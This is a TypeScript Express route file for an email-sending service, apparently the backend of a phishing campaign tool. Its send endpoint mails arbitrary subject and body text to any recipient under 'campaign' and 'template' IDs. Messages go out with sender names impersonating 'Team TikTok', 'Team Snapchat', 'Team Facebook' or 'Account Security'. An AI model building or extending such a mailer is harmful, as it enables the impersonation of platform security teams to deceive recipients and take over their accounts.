import { Router, Request, Response } from 'express';
import nodemailer from 'nodemailer';
import { 
  buildTransporter, 
  checkPlatformSmtpStatus, 
  classifySmtpError, 
  convertMarkdownToHtml, 
  checkEmailRateLimit 
} from '../services/emailService';

const router = Router();

// GET /api/email/config
router.get('/config', (req: Request, res: Response) => {
  const tk = buildTransporter('tiktok');
  const sc = buildTransporter('snapchat');

  res.status(200).json({
    tiktok:   { displayName: 'Team TikTok',   email: tk.resendApiKey ? tk.fromEmail : tk.user, configured: tk.resendApiKey ? true : tk.configured, smtpHost: tk.host || 'resend.api' },
    snapchat: { displayName: 'Team Snapchat', email: sc.resendApiKey ? sc.fromEmail : sc.user, configured: sc.resendApiKey ? true : sc.configured, smtpHost: sc.host || 'resend.api' },
  });
});

// GET /api/email/status
router.get('/status', async (req: Request, res: Response) => {
  try {
    const [tiktokStatus, snapchatStatus] = await Promise.all([
      checkPlatformSmtpStatus('tiktok'),
      checkPlatformSmtpStatus('snapchat')
    ]);
    res.status(200).json({ tiktok: tiktokStatus, snapchat: snapchatStatus });
  } catch (e) {
    res.status(500).json({ error: 'Internal server error checking connection status.' });
  }
});

// POST /api/email/test
router.post('/test', async (req: Request, res: Response) => {
  try {
    const { testRecipient, platform } = req.body;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (!testRecipient || !emailRegex.test(testRecipient)) {
      res.status(400).json({ error: 'A valid testRecipient email address is required.' });
      return;
    }
    
    const platformKey = platform === 'tiktok' ? 'tiktok' : 'snapchat';
    const displayName = platformKey === 'tiktok' ? 'Team TikTok' : 'Team Snapchat';

    const { host: h, port: p, user: u, pass: pw, configured: c, useSSL, resendApiKey, fromEmail } = buildTransporter(platformKey);
    
    if (!resendApiKey && !c) {
      res.status(500).json({ error: `${displayName} SMTP not configured in env. Please configure and restart the server.` });
      return;
    }

    if (resendApiKey) {
      const resendResponse = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${resendApiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          from: `"${displayName} Test" <${fromEmail}>`,
          to: [testRecipient],
          subject: 'SMTP/API Test',
          text: `This is a test email from the application. The Resend API connection for ${displayName} is working correctly.`,
        })
      });

      const resendData: any = await resendResponse.json();
      if (!resendResponse.ok) {
        throw new Error(resendData.message || 'Resend API returned an error.');
      }

      console.info(`[EmailService] ${displayName} Test email sent via Resend API to:`, testRecipient, '| messageId:', resendData.id);
      res.status(200).json({ success: true, messageId: resendData.id });
      return;
    }

    const transporter = nodemailer.createTransport({ host: h, port: p, secure: useSSL, auth: { user: u, pass: pw } });
    const info = await transporter.sendMail({
      from: `"${displayName} Test" <${u}>`,
      to: testRecipient,
      subject: 'SMTP Test',
      text: `This is a test email from the application. The Gmail SMTP connection for ${displayName} is working correctly.`,
    });

    console.info(`[EmailService] ${displayName} Test email sent to:`, testRecipient, '| messageId:', info.messageId);
    res.status(200).json({ success: true, messageId: info.messageId });
  } catch (err: any) {
    const { statusCode, message } = classifySmtpError(err);
    console.error('[EmailService] Test email failed:', message);
    res.status(statusCode).json({ error: message });
  }
});

// POST /api/email/send
router.post('/send', async (req: Request, res: Response) => {
  const clientIp = (req.headers['x-forwarded-for'] as string) || req.ip || 'unknown';
  if (!checkEmailRateLimit(clientIp)) {
    res.status(429).json({ error: 'Rate limit exceeded. Max 5 emails per minute.' });
    return;
  }

  try {
    const { campaignId, recipient, subject, message, templateId } = req.body;

    if (!campaignId || !recipient || !subject || !message || !templateId) {
      res.status(400).json({ error: 'Fields campaignId, recipient, subject, message, templateId are all required.' });
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(recipient)) {
      res.status(400).json({ error: 'Invalid recipient email address format.' });
      return;
    }

    if (/[\r\n]/.test(subject)) {
      res.status(400).json({ error: 'Subject contains invalid characters.' });
      return;
    }

    const tid = (templateId || '').toLowerCase();
    let displayName = 'Account Security';
    let platformKey = 'tiktok';
    if (tid.includes('tiktok') || tid === 'tpl-002') {
      displayName = 'Team TikTok';
      platformKey = 'tiktok';
    } else if (tid.includes('snapchat') || tid === 'tpl-003') {
      displayName = 'Team Snapchat';
      platformKey = 'snapchat';
    } else if (tid.includes('facebook') || tid === 'tpl-001') {
      displayName = 'Team Facebook';
      platformKey = 'snapchat'; // Fallback
    }

    const { host: h, port: p, user: u, pass: pw, configured: c, useSSL, resendApiKey, fromEmail } = buildTransporter(platformKey);
    
    if (!resendApiKey && !c) {
      res.status(500).json({ error: `SMTP server configuration for ${displayName} is incomplete.` });
      return;
    }

    if (resendApiKey) {
      const resendResponse = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${resendApiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          from: `"${displayName}" <${fromEmail}>`,
          to: [recipient],
          subject,
          text: message,
          html: convertMarkdownToHtml(message)
        })
      });

      const resendData: any = await resendResponse.json();
      if (!resendResponse.ok) {
        throw new Error(resendData.message || 'Resend API returned an error.');
      }

      console.info('[EmailService] Email sent via Resend API:', {
        campaignId,
        recipient: recipient.replace(/./g, (c: string, idx: number) => (idx < 3 || c === '@' ? c : '*')),
        displayName,
        messageId: resendData.id,
      });

      res.status(200).json({ success: true, messageId: resendData.id });
      return;
    }

    const transporter = nodemailer.createTransport({
      host: h,
      port: p,
      secure: useSSL,
      auth: { user: u, pass: pw },
      connectionTimeout: 10000,  // 10s to establish TCP connection
      greetingTimeout: 10000,    // 10s to receive SMTP greeting
      socketTimeout: 15000,      // 15s of socket inactivity before abort
    });
    const info = await transporter.sendMail({
      from: `"${displayName}" <${u}>`,
      to: recipient,
      subject,
      text: message,
      html: convertMarkdownToHtml(message),
    });

    console.info('[EmailService] Email sent:', {
      campaignId,
      recipient: recipient.replace(/./g, (c: string, idx: number) => (idx < 3 || c === '@' ? c : '*')),
      displayName,
      messageId: info.messageId,
    });

    res.status(200).json({ success: true, messageId: info.messageId });
  } catch (err: any) {
    const { statusCode, message } = classifySmtpError(err);
    console.error('[EmailService] Send failed:', message);
    res.status(statusCode).json({ error: message });
  }
});

export default router;
